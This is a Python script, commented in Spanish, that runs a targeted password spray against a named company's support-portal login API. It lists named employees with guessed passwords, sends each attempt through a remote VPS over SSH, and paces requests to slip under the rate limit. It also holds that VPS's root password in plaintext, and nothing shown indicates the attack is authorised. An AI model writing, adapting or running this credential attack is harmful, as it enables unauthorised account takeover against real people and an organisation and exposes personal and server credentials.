"""
HEXAGON spray preciso — 15 combos top, 60s delay entre requests
Rate limit: global 15min. Con 60s delay = 15 combos en 15min = exactamente al límite
"""
import paramiko, time, json
from datetime import datetime

# VPS limpia a usar (empezamos desde una que no haya fallado en este intento)
VPS = {"ip": "64.177.83.195", "pass": "Nm9.#p)WzifT.fo2"}

TARGET = "https://soporte.disperso.com/api/auth/login"

# TOP 15 combos OSINT (probabilidad decreciente)
COMBOS = [
    # Christian Ramirez — Analista Soporte/Dev (DIRECTO en Disperso)
    ("cramirez@disperso.com", "Disperso2024!"),
    ("cramirez@disperso.com", "Tuxpan2024!"),
    # Jonathan Hernandez — SW Engineer
    ("jhernandez@disperso.com", "Disperso2024!"),
    ("jhernandez@disperso.com", "Tuxpan2024!"),
    # Patricia Erazo — CEO
    ("perazo@disperso.com", "Disperso2024!"),
    ("perazo@disperso.com", "Tuxpan2025!"),
    # Sandra Ulloa — Comercial
    ("sulloa@disperso.com", "Disperso2024!"),
    # Cecilia Hoecker — Tech (email confirmado en IntelX: choecker@tuxpan.cl)
    ("choecker@disperso.com", "Disperso2024!"),
    ("choecker@disperso.com", "Tuxpan2024!"),
    # Funcionales high-prob
    ("admin@disperso.com", "Disperso2024!"),
    ("admin@disperso.com", "Disperso2025!"),
    ("soporte@disperso.com", "Disperso2024!"),
    ("soporte@disperso.com", "Soporte123!"),
    # Known email
    ("sales@disperso.com", "Disperso2024!"),
    ("sales@disperso.com", "Disperso2025!"),
]

DELAY_BETWEEN = 60  # segundos entre cada intento (ultra-conservador)

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(VPS['ip'], username='root', password=VPS['pass'], timeout=20)
print(f"[+] Conectado a {VPS['ip']}")

def run(c, cmd, timeout=20):
    _, s, _ = c.exec_command(cmd, timeout=timeout)
    return s.read().decode().strip()

results = {"started": datetime.utcnow().isoformat(), "hits": [], "tried": 0, "combos": COMBOS}

print(f"[*] Spray preciso: {len(COMBOS)} combos | {DELAY_BETWEEN}s delay")
print(f"[*] ETA: ~{len(COMBOS) * DELAY_BETWEEN // 60} minutos")
print("-" * 60)

for i, (email, pwd) in enumerate(COMBOS):
    print(f"\n[{i+1}/{len(COMBOS)}] {email}:{pwd}")
    
    cmd = (
        f'curl -sk -X POST {TARGET} '
        f'-H "Content-Type: application/json" '
        f'-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" '
        f'-H "Origin: https://soporte.disperso.com" '
        f'-H "Referer: https://soporte.disperso.com/" '
        f"-d '{{\"email\":\"{email}\",\"password\":\"{pwd}\"}}' "
        f'-w "\\nHTTP_CODE:%{{http_code}}" '
        f'--max-time 12 2>&1'
    )
    
    out = run(client, cmd, timeout=20)
    results["tried"] += 1
    
    print(f"  Response: {out[:300]}")
    
    if "HTTP_CODE:200" in out:
        print(f"\n[!!!!HIT!!!!] {email}:{pwd}")
        results["hits"].append({"email": email, "password": pwd, "response": out})
    elif "429" in out:
        print(f"  [!] RATE LIMIT 429 — parando spray")
        break
    
    # Save progress
    with open(r"c:\xampp\htdocs\pentagi\disperso_recon\hexagon_sonnet_results.json", "w") as f:
        json.dump(results, f, indent=2, default=str)
    
    if i < len(COMBOS) - 1:
        print(f"  Waiting {DELAY_BETWEEN}s for next combo...")
        time.sleep(DELAY_BETWEEN)

client.close()

results["finished"] = datetime.utcnow().isoformat()
print(f"\n[FIN] tried={results['tried']} hits={len(results['hits'])}")

with open(r"c:\xampp\htdocs\pentagi\disperso_recon\hexagon_sonnet_results.json", "w") as f:
    json.dump(results, f, indent=2, default=str)

if results["hits"]:
    print("\n[!!!] CREDENCIALES VÁLIDAS:")
    for h in results["hits"]:
        print(f"  {h['email']}:{h['password']}")
else:
    print("[*] Sin hits en spray preciso. OSINT completado.")
